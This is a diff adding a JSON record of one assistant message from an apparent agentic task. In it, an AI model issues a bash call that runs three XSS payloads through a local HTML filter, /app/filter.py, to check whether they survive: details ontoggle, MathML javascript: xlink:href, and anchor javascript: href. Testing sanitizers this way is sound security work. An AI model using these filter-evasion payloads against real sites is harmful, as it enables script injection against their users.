@@ -1,0 +1,41 @@
+{
+  "id": "gen-1775044904-mDZPJIwRfZJv1sJaRTFB",
+  "container": null,
+  "content": [
+    {
+      "id": "toolu_vrtx_01RGnwEBrhbL7dHUR5Ng9LKD",
+      "caller": {
+        "type": "direct"
+      },
+      "input": {
+        "command": "# onbegin is stripped. Let me try other approaches.\n\n# Let me try using <details><summary> with ontoggle (auto-triggered with open attribute)\ncat > /tmp/test_details.html << 'EOF'\n<details open ontoggle=\"alert(1)\"><summary>test</summary></details>\nEOF\npython /app/filter.py /tmp/test_details.html\ncat /tmp/test_details.html\necho \"---\"\n\n# Let me try using <math> tag with xlink:href\ncat > /tmp/test_math.html << 'EOF'\n<math><maction actiontype=\"statusline\" xlink:href=\"javascript:alert(1)\">CLICK<mtext>http://example.com</mtext></maction></math>\nEOF\npython /app/filter.py /tmp/test_math.html\ncat /tmp/test_math.html\necho \"---\"\n\n# Let me try <a href=\"javascript:...\"> with autofocus\ncat > /tmp/test_a.html << 'EOF'\n<a href=\"javascript:alert(1)\" id=\"xss\">click</a>\nEOF\npython /app/filter.py /tmp/test_a.html\ncat /tmp/test_a.html"
+      },
+      "name": "bash",
+      "type": "tool_use"
+    }
+  ],
+  "model": "anthropic/claude-4.6-opus-20260205",
+  "role": "assistant",
+  "stop_reason": "tool_use",
+  "stop_sequence": null,
+  "type": "message",
+  "usage": {
+    "cache_creation": null,
+    "cache_creation_input_tokens": 0,
+    "cache_read_input_tokens": 0,
+    "inference_geo": null,
+    "input_tokens": 2717,
+    "output_tokens": 345,
+    "server_tool_use": null,
+    "service_tier": null,
+    "speed": "standard",
+    "cost": 0.02221,
+    "is_byok": false,
+    "cost_details": {
+      "upstream_inference_cost": 0.02221,
+      "upstream_inference_prompt_cost": 0.013585,
+      "upstream_inference_completions_cost": 0.008625
+    }
+  },
+  "provider": "Google"
+}
